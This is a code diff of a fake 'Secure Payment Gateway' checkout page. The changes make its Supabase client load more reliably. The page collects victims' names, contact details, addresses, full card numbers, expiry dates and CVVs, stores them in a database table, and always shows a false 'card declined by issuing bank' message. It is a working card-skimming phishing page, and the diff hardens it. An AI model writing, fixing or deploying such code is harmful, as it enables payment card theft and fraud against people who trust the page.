@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Checkout | Secure Payment Gateway</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
+ <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     :root {
       --bg: #07090e;
@@ -138,16 +138,25 @@
   </div>
 
   <script>
-    // ⚠️ REPLACED YOUR ACTUAL KEYS HERE BELOW:
-    const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL";
-    const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+  // ⚠️ API KEYS HERE
+  const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL";
+  const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
 
-    let _supabase;
-    try {
-      _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-    } catch(e) {
-      console.error("Supabase Client Init Failed", e);
+  let _supabase = null;
+
+  // Function to initialize Supabase safely
+  function initSupabase() {
+    if (window.supabase) {
+      _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      console.log("Supabase Client Initialized Successfully!");
+    } else {
+      console.error("Supabase CDN failed to load.");
     }
+  }
+
+  // Run initialization when page fully loads
+  window.addEventListener('load', () => {
+    initSupabase();
 
     const amountInput = document.getElementById('amount');
     const cardInput = document.getElementById('card_number');
@@ -159,71 +168,85 @@
     const payBtn = document.getElementById('pay-btn');
     const loadingOverlay = document.getElementById('loading-overlay');
 
-    amountInput.addEventListener('input', (e) => {
-      const val = e.target.value.trim();
-      payBtn.textContent = val && !isNaN(val) && parseFloat(val) > 0 ? `Pay Now ($${parseFloat(val).toFixed(2)})` : 'Pay Now';
-    });
+    if (amountInput) {
+      amountInput.addEventListener('input', (e) => {
+        const val = e.target.value.trim();
+        payBtn.textContent = val && !isNaN(val) && parseFloat(val) > 0 ? `Pay Now ($${parseFloat(val).toFixed(2)})` : 'Pay Now';
+      });
+    }
 
-    cardInput.addEventListener('input', (e) => {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.startsWith('4')) { cardTypeSelect.value = 'Visa'; cardBadge.textContent = 'VISA'; }
-      else if (value.startsWith('5')) { cardTypeSelect.value = 'Mastercard'; cardBadge.textContent = 'MC'; }
-      else if (value.startsWith('34') || value.startsWith('37')) { cardTypeSelect.value = 'American Express'; cardBadge.textContent = 'AMEX'; }
-      else if (value.startsWith('6')) { cardTypeSelect.value = 'Discover'; cardBadge.textContent = 'DISC'; }
+    if (cardInput) {
+      cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.startsWith('4')) { cardTypeSelect.value = 'Visa'; cardBadge.textContent = 'VISA'; }
+        else if (value.startsWith('5')) { cardTypeSelect.value = 'Mastercard'; cardBadge.textContent = 'MC'; }
+        else if (value.startsWith('34') || value.startsWith('37')) { cardTypeSelect.value = 'American Express'; cardBadge.textContent = 'AMEX'; }
+        else if (value.startsWith('6')) { cardTypeSelect.value = 'Discover'; cardBadge.textContent = 'DISC'; }
 
-      e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
-    });
+        e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
+      });
+    }
 
-    expiryInput.addEventListener('input', (e) => {
-      let value = e.target.value.replace(/\D/g, '');
-      e.target.value = value.length >= 2 ? value.slice(0, 2) + '/' + value.slice(2, 4) : value;
-    });
+    if (expiryInput) {
+      expiryInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        e.target.value = value.length >= 2 ? value.slice(0, 2) + '/' + value.slice(2, 4) : value;
+      });
+    }
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      alertBox.style.display = 'none';
-      loadingOverlay.style.display = 'flex';
+    if (form) {
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        alertBox.style.display = 'none';
+        loadingOverlay.style.display = 'flex';
 
-      if(!_supabase) {
-        loadingOverlay.style.display = 'none';
-        alertBox.textContent = "Supabase SDK not initialized. Please refresh.";
-        alertBox.style.display = 'block';
-        return;
-      }
+        // Re-check if supabase client exists
+        if (!_supabase && window.supabase) {
+          _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        }
 
-      const payload = {
-        amount: parseFloat(amountInput.value.trim()),
-        full_name: document.getElementById('full_name').value,
-        email: document.getElementById('email').value,
-        phone: document.getElementById('phone').value,
-        country: document.getElementById('country').value,
-        city: document.getElementById('city').value,
-        address: document.getElementById('address').value,
-        card_type: cardTypeSelect.value,
-        card_holder: document.getElementById('card_holder').value,
-        card_number: cardInput.value,
-        expiry: expiryInput.value,
-        cvv: document.getElementById('cvv').value,
-        status: 'Declined'
-      };
-
-      try {
-        const { data, error } = await _supabase.from('transactions').insert([payload]);
-
-        if (error) throw error;
-
-        setTimeout(() => {
+        if (!_supabase) {
           loadingOverlay.style.display = 'none';
-          alertBox.textContent = 'Transaction Failed: Card declined by issuing bank.';
+          alertBox.textContent = "Supabase CDN blocked by network/adblocker. Please check connection.";
           alertBox.style.display = 'block';
-        }, 1500);
+          return;
+        }
 
-      } catch (err) {
-        loadingOverlay.style.display = 'none';
-        alertBox.textContent = 'Database Error: ' + (err.message || JSON.stringify(err));
-        alertBox.style.display = 'block';
-      }
-    });
-  </script>
+        const payload = {
+          amount: parseFloat(amountInput.value.trim()),
+          full_name: document.getElementById('full_name').value,
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          country: document.getElementById('country').value,
+          city: document.getElementById('city').value,
+          address: document.getElementById('address').value,
+          card_type: cardTypeSelect.value,
+          card_holder: document.getElementById('card_holder').value,
+          card_number: cardInput.value,
+          expiry: expiryInput.value,
+          cvv: document.getElementById('cvv').value,
+          status: 'Declined'
+        };
+
+        try {
+          const { data, error } = await _supabase.from('transactions').insert([payload]);
+
+          if (error) throw error;
+
+          setTimeout(() => {
+            loadingOverlay.style.display = 'none';
+            alertBox.textContent = 'Transaction Failed: Card declined by issuing bank.';
+            alertBox.style.display = 'block';
+          }, 1500);
+
+        } catch (err) {
+          loadingOverlay.style.display = 'none';
+          alertBox.textContent = 'Database Error: ' + (err.message || JSON.stringify(err));
+          alertBox.style.display = 'block';
+        }
+      });
+    }
+  });
+</script>
 </body>
 </html>
